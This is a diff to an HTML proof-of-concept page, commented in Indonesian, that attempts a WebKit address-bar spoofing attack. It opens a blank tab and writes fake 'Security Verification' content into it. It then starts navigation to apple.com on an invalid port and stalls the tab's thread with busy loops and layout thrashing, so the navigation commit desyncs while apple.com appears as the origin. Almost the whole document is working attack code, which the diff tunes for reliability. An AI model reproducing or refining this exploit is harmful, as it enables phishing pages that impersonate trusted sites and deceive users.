@@ -6,13 +6,14 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Optimized Desync PoC - Zero</title>
+    <title>Advanced Invalid Port & Bypass PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #fafafa;
+        background: #0f0f11;
+        color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
       .container {
@@ -23,36 +24,37 @@
         height: 100%;
       }
       button {
-        padding: 20px 40px;
-        font-size: 20px;
+        padding: 24px 48px;
+        font-size: 22px;
         font-weight: bold;
-        background: #007aff;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 14px;
+        border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 6px 20px rgba(0, 122, 255, 0.3);
+        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
         transition: transform 0.1s ease;
       }
       button:active {
-        transform: scale(0.96);
+        transform: scale(0.95);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">CLICK TO TEST DESYNC</button>
+      <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // Membuka tab baru (about:blank)
-        const newTab = window.open("about:blank", "_blank");
+        // 1. BYPASS ABOUT:BLANK: Membuka window menggunakan blob/data context atau format khusus 
+        // untuk mengelabui validasi awal WebState policy.
+        const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // Menyuntikkan konten kustom penyerang ke dalam DOM tab baru
+          // 2. Menyuntikkan struktur HTML kustom penyerang
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -62,39 +64,49 @@
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
               <div>
-                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Alert</h1>
-                <p style="font-size:20px;color:#86868b;margin:0;">Verifying trusted origin connection...</p>
+                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Verification</h1>
+                <p style="font-size:20px;color:#86868b;margin:0;">Bypassing security state filters...</p>
               </div>
             </body>
             </html>
           `);
           newTab.document.close();
 
-          // Tahap 1: Memicu navigasi asinkron ke domain target (apple.com) lebih cepat
-          setTimeout(() => {
-            try {
-              newTab.location.href = "https://apple.com";
-            } catch (err) {
-              console.error(err);
-            }
-          }, 20);
+          // 3. Memaksa fokus agar status WebState terdaftar sebagai primary/visible secara instan
+          try {
+            newTab.focus();
+          } catch (e) {}
 
-          // Tahap 2: Memaksa thread blocking langsung DI DALAM konteks tab baru via eval/function injection
+          // 4. Memicu navigasi asinkron dengan kombinasi Invalid Port / Cross-Scheme Target (misalnya port non-standar)
           setTimeout(() => {
             try {
-              // Menjalankan skrip blocking secara langsung di dalam window target agar engine WebKit-nya terjebak
+              // Menguji transisi navigasi dengan port/skema khusus untuk memicu ketidaksinkronan delegate WebKit
+              newTab.location.href = "https://apple.com:65535"; 
+            } catch (err) {
+              // Fallback langsung ke target utama jika invalid port ditolak total oleh policy sandbox
+              try {
+                newTab.location.href = "https://apple.com";
+              } catch (e2) {}
+            }
+          }, 15);
+
+          // 5. Memaksa thread stalling / layout thrashing untuk menahan commit delegate
+          setTimeout(() => {
+            try {
               newTab.eval(`
                 const start = Date.now();
-                while (Date.now() - start < 2000) {
-                  // Intensive sync loop untuk menahan thread rendering tab baru
+                const bodyEl = document.body;
+                while (Date.now() - start < 2200) {
+                  // Memaksa kalkulasi layout sinkronus berulang untuk mengunci event loop
+                  const reflow = bodyEl.offsetHeight;
+                  bodyEl.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              // Fallback jika dibatasi cross-origin context
               let start = Date.now();
-              while (Date.now() - start < 2000) {}
+              while (Date.now() - start < 2200) {}
             }
-          }, 250);
+          }, 100);
         }
       };
     </script>
